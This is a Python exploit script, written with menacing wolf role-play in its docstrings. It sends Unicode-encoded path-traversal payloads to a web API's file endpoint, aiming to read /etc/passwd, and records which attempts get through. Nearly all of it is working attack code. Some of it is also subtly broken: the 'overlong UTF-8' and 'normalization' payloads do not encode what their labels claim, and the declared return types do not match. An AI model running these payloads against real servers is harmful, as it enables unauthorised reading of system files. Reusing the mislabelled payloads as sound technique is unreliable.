"""
🐺 UNICODE PATH TRAVERSAL BYPASS EXPLOIT

*snarls with predatory glee* Your path validation can't handle Unicode tricks!
Unicode normalization and encoding attacks will bypass your filters!

*bares fangs with savage satisfaction* This exploit demonstrates Unicode-based
path traversal bypass techniques.
"""

import requests
from typing import List, Dict
from dataclasses import dataclass
from rich.console import Console

console = Console()

@dataclass
class UnicodePayload:
    """Unicode path traversal payload"""
    name: str
    payload: str
    technique: str
    description: str

@dataclass
class PathTraversalResult:
    """Result of a path traversal exploit attempt"""
    payload: UnicodePayload
    success: bool
    response_code: int
    description: str
    vulnerability_type: str = "Path Traversal"

class UnicodePathTraversalExploit:
    """
    *circles with menacing intent* Exploits Unicode path traversal vulnerabilities
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def run_exploit(self) -> List[Dict]:
        """
        *snarls with predatory glee* Execute Unicode path traversal attacks
        """
        console.print("[bold red]🐺 UNICODE PATH TRAVERSAL EXPLOIT[/bold red]")
        
        payloads = self._generate_unicode_payloads()
        results = []
        
        for payload in payloads:
            result = self._test_payload(payload)
            results.append(result)
        
        return results
    
    def _generate_unicode_payloads(self) -> List[UnicodePayload]:
        """Generate Unicode-based traversal payloads"""
        return [
            UnicodePayload(
                name="Unicode Dot",
                payload="\u002e\u002e\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064",
                technique="Unicode Escaping",
                description="Unicode-encoded path traversal"
            ),
            UnicodePayload(
                name="UTF-8 Overlong",
                payload="\u00c0\u00ae\u00c0\u00ae\u00c0\u00af\u0065\u0074\u0063\u00c0\u00af\u0070\u0061\u0073\u0073\u0077\u0064",
                technique="UTF-8 Overlong Encoding",
                description="UTF-8 overlong encoding bypass"
            ),
            UnicodePayload(
                name="Unicode Normalization",
                payload="\u0041\u0300\u0041\u0300\u0041\u0300\u0065\u0074\u0063\u0041\u0300\u0070\u0061\u0073\u0073\u0077\u0064",
                technique="Unicode Normalization",
                description="Unicode normalization attack"
            )
        ]
    
    def _test_payload(self, payload: UnicodePayload) -> Dict:
        """Test a Unicode payload"""
        try:
            response = self.session.get(
                f"{self.base_url}/api/files/{payload.payload}",
                timeout=5
            )
            
            return PathTraversalResult(
                payload=payload,
                success=response.status_code == 200,
                response_code=response.status_code,
                description=f"{payload.description} - {'SUCCESS' if response.status_code == 200 else 'BLOCKED'}"
            )
            
        except Exception as e:
            return PathTraversalResult(
                payload=payload,
                success=False,
                response_code=0,
                description=f"{payload.description} - ERROR: {str(e)}"
            )
